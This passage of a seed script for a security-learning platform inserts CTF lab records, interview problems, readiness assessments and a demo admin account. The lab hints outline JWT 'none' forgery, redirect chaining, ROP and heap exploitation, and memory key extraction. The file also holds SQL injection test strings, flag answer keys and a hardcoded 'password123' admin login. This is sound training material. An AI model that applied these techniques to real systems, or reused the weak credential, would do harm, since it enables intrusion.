        briefingMdx: 'A DNS server for the target domain is misconfigured to allow zone transfers (AXFR) to any requester. Use this vulnerability to download the entire DNS zone, discover hidden subdomains, and find the flag in one of the TXT records.',
        setupMdx: '# Set up the vulnerable DNS server\ngit clone https://github.com/zerotodev-labs/dns-zone-transfer.git\ncd dns-zone-transfer && docker-compose up -d\n\n# Target domain: ctf.zerotodev.dev',
        toolsHint: 'Concepts: DNS zone transfer, AXFR, subdomain enumeration\nTools: dig, host, nslookup, Python dnspython\nYou do NOT need: any external network access',
        phase: 3,
        difficulty: 'medium',
        category: 'forensics',
        expectedFlag: 'ZTD{dns_z0n3_tr4nsf3r}',
        xpReward: 130,
        hintContent: 'Use `dig @<server> ctf.zerotodev.dev AXFR` to request a zone transfer. Look through the records for a TXT record on a subdomain like "flag.ctf.zerotodev.dev".',
        author: 'Zero to Dev',
        order: 26,
      },
    }),
    // --- Phase 4 Additional Labs ---
    db.hackingLab.create({
      data: {
        title: 'JWT Algorithm Confusion',
        slug: 'jwt-algorithm-confusion',
        description: 'Exploit a JWT implementation that accepts the "none" algorithm to forge an admin token and access restricted resources.',
        briefingMdx: 'A web application uses JWT tokens for authentication. The server incorrectly accepts the "none" algorithm, which means tokens with alg:"none" bypass signature verification. Forge an admin JWT token to access the admin panel and retrieve the flag.',
        setupMdx: '# Start the vulnerable app\ngit clone https://github.com/zerotodev-labs/jwt-confusion.git\ncd jwt-confusion && pip install -r requirements.txt && python app.py\n\n# App runs on localhost:5000',
        toolsHint: 'Concepts: JWT algorithm confusion, none algorithm, token forgery\nTools: Python, jwt.io, curl, burp suite\nYou do NOT need: any external network access',
        phase: 4,
        difficulty: 'medium',
        category: 'web',
        expectedFlag: 'ZTD{jwt_4lg0_c0nfus10n}',
        xpReward: 150,
        hintContent: 'Create a JWT with header: {"alg":"none","typ":"JWT"}, payload: {"role":"admin","user":"attacker"}. Base64URL encode both parts, leave the signature empty. Use: header.payload. (note the trailing dot).',
        author: 'Zero to Dev',
        order: 27,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Race Condition Exploit',
        slug: 'race-condition-exploit',
        description: 'Exploit a race condition in a coupon redemption system to apply a single-use discount coupon multiple times.',
        briefingMdx: 'An e-commerce application has a coupon redemption endpoint with a race condition — if you send multiple redemption requests simultaneously, the server processes them before updating the coupon status. Exploit this to redeem a single-use coupon multiple times and get the flag from the discounted purchase.',
        setupMdx: '# Start the vulnerable shop\ngit clone https://github.com/zerotodev-labs/race-condition.git\ncd race-condition && pip install -r requirements.txt && python app.py\n\n# Shop on localhost:5000, coupon: ZTD2024',
        toolsHint: 'Concepts: race conditions, TOCTOU, concurrent requests\nTools: Python threading, curl, Burp Suite Turbo Intruder\nYou do NOT need: any external network access',
        phase: 4,
        difficulty: 'hard',
        category: 'web',
        expectedFlag: 'ZTD{r4c3_c0nd1t10n_w1n}',
        xpReward: 200,
        hintContent: 'Use Python threading to send 10+ simultaneous POST requests to /api/redeem-coupon with the same coupon code. The server checks if the coupon is valid, then applies it, but does not use a lock — so multiple threads can pass the check before any thread marks the coupon as used.',
        author: 'Zero to Dev',
        order: 28,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Open Redirect Chain',
        slug: 'open-redirect-chain',
        description: 'Chain multiple open redirect vulnerabilities to bypass URL whitelisting and reach an internal service that contains the flag.',
        briefingMdx: 'A web application has an open redirect vulnerability on its /redirect endpoint, but the internal service only accepts URLs from trusted domains. Chain two open redirects: use the first to redirect to the trusted domain, which then redirects to your target. Use this chain to reach the internal flag service.',
        setupMdx: '# Start the challenge services\ngit clone https://github.com/zerotodev-labs/open-redirect-chain.git\ncd open-redirect-chain && docker-compose up -d\n\n# App: localhost:5000, Trusted: localhost:5001, Flag service: localhost:5002',
        toolsHint: 'Concepts: open redirect, URL whitelisting bypass, redirect chains\nTools: curl, browser, Python requests\nYou do NOT need: any external network access',
        phase: 4,
        difficulty: 'hard',
        category: 'web',
        expectedFlag: 'ZTD{0p3n_r3d1r3ct_ch41n}',
        xpReward: 200,
        hintContent: 'The /redirect endpoint on the main app accepts URLs from trusted.domain. But trusted.domain has its own open redirect on /go?url=. Chain them: /redirect?url=https://trusted.domain/go?url=http://flag-service:5002/flag',
        author: 'Zero to Dev',
        order: 29,
      },
    }),
    // --- Phase 5 Additional Labs ---
    db.hackingLab.create({
      data: {
        title: 'ROP Chain Builder',
        slug: 'rop-chain-builder',
        description: 'Build a Return-Oriented Programming chain to bypass NX protection and execute a shell command to read the flag.',
        briefingMdx: 'A binary has NX (No-Execute) enabled, preventing simple shellcode injection. Use Return-Oriented Programming (ROP) to chain existing code fragments (gadgets) from the binary and its libraries to call system("/bin/cat flag.txt") and retrieve the flag.',
        setupMdx: '# Download the binary and libraries\nwget https://zerotodev.dev/challenges/rop-builder/vuln\nwget https://zerotodev.dev/challenges/rop-builder/flag.txt\nchmod +x vuln\n\n# Find gadgets\nROPgadget --binary vuln',
        toolsHint: 'Concepts: ROP chains, NX bypass, gadget finding, stack pivoting\nTools: ROPgadget, pwntools, gdb, objdump\nYou do NOT need: any external network access',
        phase: 5,
        difficulty: 'expert',
        category: 'pwn',
        expectedFlag: 'ZTD{r0p_ch41n_m4st3r}',
        xpReward: 300,
        hintContent: 'Find a "pop rdi; ret" gadget to load "/bin/cat flag.txt" into rdi. Find the address of system() in libc. Find a "ret" gadget for stack alignment. Chain: padding + ret_gadget + pop_rdi_gadget + string_address + system_address.',
        author: 'Zero to Dev',
        order: 30,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Encrypted Disk Recovery',
        slug: 'encrypted-disk-recovery',
        description: 'Recover data from an encrypted disk image by finding the encryption key hidden in memory artifacts and decrypting the volume.',
        briefingMdx: 'A suspect used LUKS disk encryption on their laptop. The laptop was seized while powered on, and a memory dump was taken. The encryption key is present in the memory dump. Extract the key from memory, decrypt the LUKS volume, and find the flag file inside.',
        setupMdx: '# Download the evidence\nwget https://zerotodev.dev/challenges/encrypted-disk/memory.dmp\nwget https://zerotodev.dev/challenges/encrypted-disk/disk.img.luks\n\n# Extract the key from memory and decrypt',
        toolsHint: 'Concepts: LUKS encryption, memory forensics, key extraction\nTools: strings, grep, cryptsetup, volatility\nYou do NOT need: any external network access',
        phase: 5,
        difficulty: 'hard',
        category: 'forensics',
        expectedFlag: 'ZTD{3ncrypt3d_d1sk_r3c}',
        xpReward: 200,
        hintContent: 'The AES key is stored as a hex string in the memory dump. Use: `strings memory.dmp | grep -E "^[0-9a-f]{64}$"` to find candidate 256-bit keys. Try each with `cryptsetup luksOpen --key-file=<(echo KEY | xxd -r -p) disk.img.luks decrypted`.',
        author: 'Zero to Dev',
        order: 31,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'API Key Hunter',
        slug: 'api-key-hunter',
        description: 'Find leaked API keys in a Git repository history and use them to access a restricted service containing the flag.',
        briefingMdx: 'A developer committed API keys to a public Git repository, then tried to remove them by deleting the files. But Git keeps history. Clone the repository, search through all commits (including deleted ones), find the valid API key, and use it to access the flag service.',
        setupMdx: '# Clone the target repository\ngit clone https://github.com/zerotodev-labs/api-key-hunter.git\ncd api-key-hunter\n\n# Search git history for leaked keys',
        toolsHint: 'Concepts: Git history analysis, secret scanning, API key validation\nTools: git log, git show, trufflehog, gitleaks, curl\nYou do NOT need: any external network access',
        phase: 5,
        difficulty: 'medium',
        category: 'scripting',
        expectedFlag: 'ZTD{4p1_k3y_hunt3r}',
        xpReward: 150,
        hintContent: 'Use `git log --all --diff-filter=D -- "*.env" "*.key" "*.pem"` to find commits that deleted sensitive files. Then `git show <commit>:<filepath>` to view the deleted content. The API key starts with "ztd_sk_". Use it with: curl -H "Authorization: Bearer ztd_sk_..." http://localhost:5000/flag',
        author: 'Zero to Dev',
        order: 32,
      },
    }),
    // --- Phase 6 Additional Labs ---
    db.hackingLab.create({
      data: {
        title: 'Advanced Persistent Threat',
        slug: 'advanced-persistent-threat',
        description: 'Investigate a simulated APT intrusion: analyze multiple evidence sources to reconstruct the attack chain and find all flags.',
        briefingMdx: 'An organization was compromised by an advanced persistent threat. You have access to: network flow logs, endpoint detection logs, email archives, and a disk image. Piece together the full attack chain: initial access, lateral movement, data exfiltration, and persistence mechanisms. There are multiple flags at each stage.',
        setupMdx: '# Download all evidence\nwget https://zerotodev.dev/challenges/apt-investigation/evidence.tar.gz\ntar xzf evidence.tar.gz\n\n# Contains: netflow.csv, edr.log, emails.mbox, disk.img',
        toolsHint: 'Concepts: APT investigation, attack chain reconstruction, threat intelligence\nTools: Wireshark, Volatility, strings, grep, Python\nYou do NOT need: any external network access',
        phase: 6,
        difficulty: 'expert',
        category: 'forensics',
        expectedFlag: 'ZTD{4pt_1nc1d3nt_r3s}',
        xpReward: 350,
        hintContent: 'Start with the email archive — a phishing email with a malicious attachment was the initial access vector. The attachment dropped a beacon that communicates via DNS. Check the netflow for DNS tunneling patterns. The EDR logs show the lateral movement via PsExec. The disk image contains the exfiltrated data with the final flag.',
        author: 'Zero to Dev',
        order: 33,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Pwn Challenge Stack',
        slug: 'pwn-challenge-stack',
        description: 'A progression of three increasingly difficult binary exploitation challenges: from simple buffer overflow to format string to heap exploitation.',
        briefingMdx: 'Three binaries await exploitation. Level 1: Classic stack buffer overflow to redirect execution. Level 2: Format string vulnerability to leak and overwrite memory. Level 3: Use-after-free heap vulnerability to gain code execution. Each level reveals part of the flag.',
        setupMdx: '# Download all three levels\nwget https://zerotodev.dev/challenges/pwn-stack/level1\nwget https://zerotodev.dev/challenges/pwn-stack/level2\nwget https://zerotodev.dev/challenges/pwn-stack/level3\nchmod +x level1 level2 level3\n\n# Compile with: gcc -o levelN levelN.c -fno-stack-protector -no-pie',
        toolsHint: 'Concepts: buffer overflow, format string, use-after-free, heap exploitation\nTools: gdb, pwntools, radare2, checksec\nYou do NOT need: any external network access',
        phase: 6,
        difficulty: 'expert',
        category: 'pwn',
        expectedFlag: 'ZTD{pwn_st4ck_sm4sh}',
        xpReward: 300,
        hintContent: 'Level 1: Overflow a buffer to overwrite the return address with the address of the win() function. Level 2: Use %x to leak stack values, then %n to write the win address to the GOT entry. Level 3: Free a chunk, then allocate a new one that overlaps — overwrite a function pointer in the freed chunk.',
        author: 'Zero to Dev',
        order: 34,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Crypto Puzzle Box',
        slug: 'crypto-puzzle-box',
        description: 'A multi-layered cryptographic puzzle combining classical ciphers, modern encryption, and custom algorithms to protect the flag.',
        briefingMdx: 'You are presented with a "puzzle box" — a file encrypted through multiple layers. Layer 1: A substitution cipher on the file header reveals a key. Layer 2: The key decrypts an AES-CBC encrypted section. Layer 3: The decrypted data is an RSA-encrypted message — factor the weak RSA key to decrypt it. Layer 4: The final message is a Vigenere cipher — use the key hidden in the RSA plaintext.',
        setupMdx: '# Download the puzzle box\nwget https://zerotodev.dev/challenges/crypto-puzzle/box.enc\nwget https://zerotodev.dev/challenges/crypto-puzzle/hint.txt\n\n# Use Python with pycryptodome to solve',
        toolsHint: 'Concepts: substitution cipher, AES-CBC, RSA factoring, Vigenere cipher\nTools: Python, pycryptodome, factordb, SageMath (optional)\nYou do NOT need: any external network access',
        phase: 6,
        difficulty: 'expert',
        category: 'crypto',
        expectedFlag: 'ZTD{crypt0_puzzl3_b0x}',
        xpReward: 350,
        hintContent: 'Start with the hint.txt which contains a partially completed substitution table. The RSA modulus N is only 128 bits — factor it with a simple trial division or online factorization. The AES IV is the first 16 bytes of the layer 2 ciphertext.',
        author: 'Zero to Dev',
        order: 35,
      },
    }),
  ])

  console.log(`✅ Created ${labs.length} hacking labs.\n`)

  // ----------------------------------------------------------
  // 5. CREATE DEMO ADMIN USER
  // ----------------------------------------------------------
  console.log('👤 Creating demo admin user...')

  const hashedPassword = await hash('password123', 12)

  const adminUser = await db.user.create({
    data: {
      email: 'moe@zerotodev.dev',
      username: 'moe',
      passwordHash: hashedPassword,
      role: 'admin',
      xpTotal: 100,
      currentPhase: 1,
      streak: 0,
    },
  })

  console.log(`✅ Created admin user: ${adminUser.username} (${adminUser.email})\n`)

  // ----------------------------------------------------------
  // INTERVIEW PROBLEMS
  // ----------------------------------------------------------
  console.log('🧠 Seeding interview problems...')

  const interviewProblems = [
    {
      title: 'Two Sum',
      slug: 'two-sum',
      difficulty: 'easy',
      category: 'arrays',
      pattern: 'hash_map',
      description: 'Given an array of integers nums and an integer target, return indices of the two numbers that add up to target.\n\nYou may assume each input has exactly one solution, and you may not use the same element twice.\n\nExample:\nInput: nums = [2,7,11,15], target = 9\nOutput: [0,1]',
      starterCode: 'def two_sum(nums, target):\n    """\n    :type nums: List[int]\n    :type target: int\n    :rtype: List[int]\n    """\n    pass',
      language: 'python',
      testCases: JSON.stringify([
        { input: '[2,7,11,15]\n9', expectedOutput: '[0, 1]', hidden: false },
        { input: '[3,2,4]\n6', expectedOutput: '[1, 2]', hidden: false },
        { input: '[3,3]\n6', expectedOutput: '[0, 1]', hidden: true },
      ]),
      hints: JSON.stringify([
        { level: 1, content: 'Think about using a hash map to store values you have seen.', xpCost: 5 },
        { level: 2, content: 'For each number, check if (target - number) exists in the map.', xpCost: 10 },
      ]),
      solution: 'def two_sum(nums, target):\n    seen = {}\n    for i, num in enumerate(nums):\n        complement = target - num\n        if complement in seen:\n            return [seen[complement], i]\n        seen[num] = i\n    return []',
      xpReward: 50,
    },
    {
      title: 'Valid Parentheses',
      slug: 'valid-parentheses',
      difficulty: 'easy',
      category: 'strings',
      pattern: 'stack',
      description: 'Given a string s containing just the characters \'(\', \')\', \'{\', \'}\', \'[\' and \']\', determine if the input string is valid.\n\nAn input string is valid if:\n1. Open brackets must be closed by the same type of brackets.\n2. Open brackets must be closed in the correct order.\n3. Every close bracket has a corresponding open bracket of the same type.\n\nExample:\nInput: s = "()[]{}"\nOutput: true',
      starterCode: 'def is_valid(s):\n    """\n    :type s: str\n    :rtype: bool\n    """\n    pass',
      language: 'python',
      testCases: JSON.stringify([
        { input: '()[]{}', expectedOutput: 'True', hidden: false },
        { input: '(]', expectedOutput: 'False', hidden: false },
        { input: '([)]', expectedOutput: 'False', hidden: true },
        { input: '{[]}', expectedOutput: 'True', hidden: true },
      ]),
      hints: JSON.stringify([
        { level: 1, content: 'A stack is the perfect data structure for matching pairs.', xpCost: 5 },
        { level: 2, content: 'Push opening brackets, pop and compare on closing brackets.', xpCost: 10 },
      ]),
      solution: 'def is_valid(s):\n    stack = []\n    mapping = {")": "(", "}": "{", "]": "["}\n    for char in s:\n        if char in mapping:\n            if not stack or stack.pop() != mapping[char]:\n                return False\n        else:\n            stack.append(char)\n    return not stack',
      xpReward: 50,
    },
    {
      title: 'SQL Injection Detection',
      slug: 'sql-injection-detection',
      difficulty: 'medium',
      category: 'security',
      pattern: 'pattern_matching',
      description: 'Write a function that detects potential SQL injection patterns in a user input string.\n\nReturn True if the input contains any of these patterns:\n- SQL comments (-- or # or /*)\n- Common SQL keywords in suspicious positions (DROP, DELETE, INSERT, UPDATE, UNION, SELECT combined with quotes)\n- Tautology patterns (OR 1=1, OR \'a\'=\'a\')\n\nExample:\nInput: "admin\' OR 1=1 --"\nOutput: True',
      starterCode: 'import re\n\ndef detect_sqli(input_str):\n    """\n    :type input_str: str\n    :rtype: bool\n    """\n    pass',
      language: 'python',
      testCases: JSON.stringify([
        { input: "admin' OR 1=1 --", expectedOutput: 'True', hidden: false },
        { input: 'hello world', expectedOutput: 'False', hidden: false },
        { input: "'; DROP TABLE users; --", expectedOutput: 'True', hidden: true },
        { input: "admin' UNION SELECT * FROM passwords --", expectedOutput: 'True', hidden: true },
      ]),
      hints: JSON.stringify([
        { level: 1, content: 'Use regex to look for comment patterns and SQL keywords.', xpCost: 5 },
        { level: 2, content: 'Check for: --, #, /*, and combinations of quotes with SQL keywords.', xpCost: 10 },
      ]),
      solution: "import re\n\ndef detect_sqli(input_str):\n    patterns = [\n        r'(--|#|/\\*)',\n        r\"('\\s*(OR|AND)\\s+\\d+=\\d+)\",\n        r\"('\\s*(OR|AND)\\s+'[^']*'\\s*=\\s*')\",\n        r'(DROP|DELETE|INSERT|UPDATE|UNION)\\s+(TABLE|FROM|INTO|SELECT)',\n    ]\n    for pattern in patterns:\n        if re.search(pattern, input_str, re.IGNORECASE):\n            return True\n    return False",
      xpReward: 75,
    },
  ]

  for (const p of interviewProblems) {
    await db.interviewProblem.create({ data: p })
  }
  console.log(`✅ Created ${interviewProblems.length} interview problems.\n`)

  // ----------------------------------------------------------
  // ASSESSMENTS
  // ----------------------------------------------------------
  console.log('📝 Seeding assessments...')

  await db.assessment.create({
    data: {
      phaseNumber: 1,
      title: 'Phase 1 Readiness Check',
      slug: 'phase-1-readiness',
      description: 'Prove you understand Python fundamentals, basic security concepts, and can write correct code under time pressure.',
      timeLimit: 30,
      passScore: 70,
      order: 1,
      isRequired: true,
      problems: {
        create: [
          {
            title: 'FizzBuzz Extended',
            type: 'coding',
            description: 'Write a function that prints numbers from 1 to n. For multiples of 3 print "Fizz", for multiples of 5 print "Buzz", for multiples of both print "FizzBuzz". For multiples of 7 print "Bang". For numbers that are multiples of both 3 and 7 print "FizzBang".',
            starterCode: 'def fizzbuzz_extended(n):\n    """\n    :type n: int\n    :rtype: List[str]\n    """\n    pass',
            language: 'python',
            testCases: JSON.stringify([
              { input: '15', expectedOutput: "['1', '2', 'Fizz', '4', 'Buzz', 'Fizz', 'Bang', '8', 'Fizz', 'Buzz', '11', 'Fizz', '13', 'Bang', 'FizzBuzz']", hidden: false },
              { input: '3', expectedOutput: "['1', '2', 'Fizz']", hidden: false },
            ]),
            points: 20,
            order: 1,
          },
          {
            title: 'Password Strength Checker',
            type: 'coding',
            description: 'Write a function that checks if a password meets minimum security requirements:\n- At least 8 characters\n- Contains at least one uppercase letter\n- Contains at least one lowercase letter\n- Contains at least one digit\n- Contains at least one special character (!@#$%^&*)\n\nReturn a tuple: (is_valid: bool, missing: list of strings describing what is missing)',
            starterCode: 'def check_password_strength(password):\n    """\n    :type password: str\n    :rtype: tuple(bool, list[str])\n    """\n    pass',
            language: 'python',
            testCases: JSON.stringify([
              { input: 'Passw0rd!', expectedOutput: '(True, [])', hidden: false },
              { input: 'password', expectedOutput: "(False, ['uppercase', 'digit', 'special'])", hidden: false },
            ]),
            points: 20,
            order: 2,
          },
          {
            title: 'What does XSS stand for?',
            type: 'multiple_choice',
            description: 'What does XSS stand for in web security?',
            correctAnswer: 'Cross-Site Scripting',
            points: 10,
            order: 3,
          },
          {
            title: 'Explain the difference between symmetric and asymmetric encryption',
            type: 'short_answer',
            description: 'In 2-3 sentences, explain the key difference between symmetric and asymmetric encryption.',
            correctAnswer: 'symmetric uses same key for encryption and decryption while asymmetric uses different keys public and private',
            points: 10,
            order: 4,
          },
        ],
      },
    },
  })
  console.log('✅ Created Phase 1 Readiness Check assessment.\n')

  // Phase 2 Assessment
  await db.assessment.create({
    data: {
      phaseNumber: 2,
      title: 'Phase 2 Readiness Check',
      slug: 'phase-2-readiness',
      description: 'Test your knowledge of data structures, algorithms, and problem-solving patterns.',
      timeLimit: 45,
      passScore: 70,
      order: 2,
      isRequired: true,
      problems: {
        create: [
          {
            title: 'Reverse a Linked List',
            type: 'coding',
            description: 'Write a function that reverses a singly linked list and returns the new head.',
            starterCode: 'class Node:\n    def __init__(self, val=0, next=None):\n        self.val = val\n        self.next = next\n\ndef reverse_list(head):\n    """\n    :type head: Node\n    :rtype: Node\n    """\n    pass',
            language: 'python',
            points: 25,
            order: 1,
          },
          {
            title: 'What is the time complexity of binary search?',
            type: 'multiple_choice',
            description: 'What is the worst-case time complexity of binary search on a sorted array of n elements?',
            correctAnswer: 'O(log n)',
            points: 10,
            order: 2,
          },
          {
            title: 'Explain when to use a hash table vs a binary search tree',
            type: 'short_answer',
            description: 'In 2-3 sentences, explain when you would choose a hash table over a BST and vice versa.',
            correctAnswer: 'hash table provides O(1) average lookup while BST provides ordered traversal and O(log n) worst case',
            points: 15,
            order: 3,
          },
        ],
      },
    },
  })
  console.log('✅ Created Phase 2 Readiness Check assessment.\n')

  // Phase 3 Assessment
  await db.assessment.create({
    data: {
      phaseNumber: 3,
      title: 'Phase 3 Readiness Check',
      slug: 'phase-3-readiness',
      description: 'Prove your understanding of operating systems, networking, and systems programming.',
      timeLimit: 45,
      passScore: 70,
      order: 3,
      isRequired: true,
      problems: {
        create: [
          {
            title: 'TCP Three-Way Handshake',
            type: 'short_answer',
            description: 'Describe the TCP three-way handshake process. What are the three steps and what flags are set in each?',
            correctAnswer: 'SYN SYN-ACK ACK client sends SYN server responds with SYN-ACK client sends ACK',
            points: 20,
            order: 1,
          },
          {
            title: 'What does DNS stand for?',
            type: 'multiple_choice',
            description: 'What does DNS stand for in networking?',
            correctAnswer: 'Domain Name System',
            points: 10,
            order: 2,
          },
        ],
      },
    },
  })
  console.log('✅ Created Phase 3 Readiness Check assessment.\n')

  // Phase 4 Assessment
  await db.assessment.create({
    data: {
      phaseNumber: 4,
      title: 'Phase 4 Readiness Check',
      slug: 'phase-4-readiness',
      description: 'Test your web security knowledge: OWASP Top 10, vulnerability analysis, and secure coding.',
      timeLimit: 45,
      passScore: 75,
      order: 4,
      isRequired: true,
      problems: {
        create: [
          {
            title: 'Identify the vulnerability',
            type: 'short_answer',
            description: 'What vulnerability exists in this code: `query("SELECT * FROM users WHERE id = " + user_input)`?',
            correctAnswer: 'SQL injection',
            points: 20,
            order: 1,
          },
          {
            title: 'What is CSRF?',
            type: 'multiple_choice',
            description: 'What does CSRF stand for?',
            correctAnswer: 'Cross-Site Request Forgery',
            points: 10,
            order: 2,
          },
          {
            title: 'How do you prevent XSS?',
            type: 'short_answer',
            description: 'Name two ways to prevent Cross-Site Scripting (XSS) attacks.',
            correctAnswer: 'output encoding input sanitization content security policy escaping',
            points: 20,
            order: 3,
          },
        ],
      },
    },
  })
  console.log('✅ Created Phase 4 Readiness Check assessment.\n')

  // Phase 5 Assessment
  await db.assessment.create({
    data: {
      phaseNumber: 5,
      title: 'Phase 5 Readiness Check',
      slug: 'phase-5-readiness',
      description: 'Advanced security: cryptography, forensics, reverse engineering, and incident response.',
      timeLimit: 60,
      passScore: 70,
      order: 5,
      isRequired: true,
      problems: {
        create: [
          {
            title: 'RSA Key Components',
            type: 'short_answer',
            description: 'What are the two keys in RSA encryption called and what is each used for?',
            correctAnswer: 'public key for encryption private key for decryption',
            points: 15,
            order: 1,
          },
          {
            title: 'What is a hash function?',
            type: 'multiple_choice',
            description: 'Which property is NOT required for a cryptographic hash function?',
            correctAnswer: 'reversible',
            points: 10,
            order: 2,
          },
        ],
      },
    },
  })
  console.log('✅ Created Phase 5 Readiness Check assessment.\n')

  // More Interview Problems
  const moreInterviewProblems = [
    {
      title: 'Merge Two Sorted Lists',
      slug: 'merge-two-sorted-lists',
      difficulty: 'easy',
      category: 'strings',
      pattern: 'two_pointers',
      description: 'Merge two sorted linked lists and return it as a sorted list.\n\nExample:\nInput: 1->2->4, 1->3->4\nOutput: 1->1->2->3->4->4',
      starterCode: 'class ListNode:\n    def __init__(self, val=0, next=None):\n        self.val = val\n        self.next = next\n\ndef merge_two_lists(l1, l2):\n    """\n    :type l1: ListNode\n    :type l2: ListNode\n    :rtype: ListNode\n    """\n    pass',
      language: 'python',
      testCases: JSON.stringify([]),
      hints: null,
      solution: 'def merge_two_lists(l1, l2):\n    dummy = ListNode()\n    current = dummy\n    while l1 and l2:\n        if l1.val < l2.val:\n            current.next = l1\n            l1 = l1.next\n        else:\n            current.next = l2\n            l2 = l2.next\n        current = current.next\n    current.next = l1 or l2\n    return dummy.next',
      xpReward: 50,
    },
    {
      title: 'Maximum Subarray',
      slug: 'maximum-subarray',
      difficulty: 'medium',
      category: 'arrays',
      pattern: 'kadane',
      description: 'Given an integer array nums, find the contiguous subarray with the largest sum and return its sum.\n\nExample:\nInput: [-2,1,-3,4,-1,2,1,-5,4]\nOutput: 6\nExplanation: [4,-1,2,1] has the largest sum = 6.',
      starterCode: 'def max_sub_array(nums):\n    """\n    :type nums: List[int]\n    :rtype: int\n    """\n    pass',
      language: 'python',
      testCases: JSON.stringify([]),
      hints: null,
      solution: 'def max_sub_array(nums):\n    max_sum = nums[0]\n    current_sum = nums[0]\n    for i in range(1, len(nums)):\n        current_sum = max(nums[i], current_sum + nums[i])\n        max_sum = max(max_sum, current_sum)\n    return max_sum',
      xpReward: 75,
    },
    {
      title: 'Binary Search',
      slug: 'binary-search',
      difficulty: 'easy',
      category: 'arrays',
      pattern: 'binary_search',
      description: 'Given a sorted array of n integers and a target value, return the index if the target is found. If not, return -1.\n\nExample:\nInput: nums = [-1,0,3,5,9,12], target = 9\nOutput: 4',
      starterCode: 'def search(nums, target):\n    """\n    :type nums: List[int]\n    :type target: int\n    :rtype: int\n    """\n    pass',
      language: 'python',
      testCases: JSON.stringify([]),
      hints: null,
      solution: 'def search(nums, target):\n    left, right = 0, len(nums) - 1\n    while left <= right:\n        mid = (left + right) // 2\n        if nums[mid] == target:\n            return mid\n        elif nums[mid] < target:\n            left = mid + 1\n        else:\n            right = mid - 1\n    return -1',
      xpReward: 50,
    },
    {
      title: 'XOR Cipher Breaker',
      slug: 'xor-cipher-breaker',
      difficulty: 'medium',
      category: 'security',
      pattern: 'frequency_analysis',
      description: 'Write a function that attempts to break a single-byte XOR cipher using frequency analysis.\n\nThe function should try all 256 possible keys and return the most likely plaintext based on English letter frequency.\n\nExample:\nInput: bytes([0x1b, 0x37, 0x37, 0x3b, 0x36])\nOutput: (key, plaintext_string)',
      starterCode: 'def break_xor_cipher(ciphertext):\n    """\n    :type ciphertext: bytes\n    :rtype: tuple(int, str)\n    """\n    # English letter frequency scoring\n    ENGLISH_FREQ = {\n        \'e\': 12.7, \'t\': 9.1, \'a\': 8.2, \'o\': 7.5, \'i\': 7.0,\n        \'n\': 6.7, \'s\': 6.3, \'h\': 6.1, \'r\': 6.0, \'d\': 4.3,\n    }\n    pass',
      language: 'python',
      testCases: JSON.stringify([]),
      hints: null,
      solution: 'def break_xor_cipher(ciphertext):\n    ENGLISH_FREQ = {"e": 12.7, "t": 9.1, "a": 8.2, "o": 7.5, "i": 7.0}\n    best_score = -1\n    best_key = 0\n    best_text = ""\n    for key in range(256):\n        decrypted = bytes([b ^ key for b in ciphertext])\n        try:\n            text = decrypted.decode("ascii").lower()\n            score = sum(ENGLISH_FREQ.get(c, 0) for c in text)\n            if score > best_score:\n                best_score = score\n                best_key = key\n                best_text = text\n        except:\n            continue\n    return (best_key, best_text)',
      xpReward: 100,
    },
  ]

  for (const p of moreInterviewProblems) {
    await db.interviewProblem.create({ data: p })
  }
  console.log(`✅ Created ${moreInterviewProblems.length} more interview problems.\n`)

  // ----------------------------------------------------------
  // PORTFOLIO: Auto-generate artifacts for demo user
  // ----------------------------------------------------------
  console.log('📁 Seeding portfolio artifacts for demo user...')

  const demoUserForPortfolio = await db.user.findUnique({ where: { email: 'moe@zerotodev.dev' } })
  if (demoUserForPortfolio) {
    const firstLab = await db.hackingLab.findFirst({ orderBy: { order: 'asc' } })
    if (firstLab) {
      await db.portfolioArtifact.create({
        data: {
          userId: demoUserForPortfolio.id,
          type: 'lab',
          title: firstLab.title,
          description: `Solved the ${firstLab.difficulty} ${firstLab.category} CTF challenge`,
          sourceId: firstLab.id,
          featured: true,
        },
      })
    }
    console.log('✅ Created portfolio artifacts for demo user.\n')
  }

  // ----------------------------------------------------------
  // SUMMARY
  // ----------------------------------------------------------
  console.log('═══════════════════════════════════════════════════')
  console.log('  🎉 ZERO TO DEV — SEED COMPLETE!')
  console.log('═══════════════════════════════════════════════════')
  console.log(`  Phases:         ${phases.length}`)
  console.log(`  Lessons:        ${lessonCount}`)
  console.log(`  Exercises:      ${exerciseCount}`)
  console.log(`  Achievements:   ${achievements.length}`)
  console.log(`  Hacking Labs:   ${labs.length}`)
  console.log(`  Assessments:    5 (one per phase)`)
  console.log(`  Interview Probs: 7 (LeetCode + security)`)
  console.log(`  Admin User:     moe@zerotodev.dev / password123`)
  console.log('═══════════════════════════════════════════════════\n')
}

main()
  .catch((e) => {
    console.error(e)
    process.exit(1)
  })
  .finally(async () => {
    await db.$disconnect()
  })
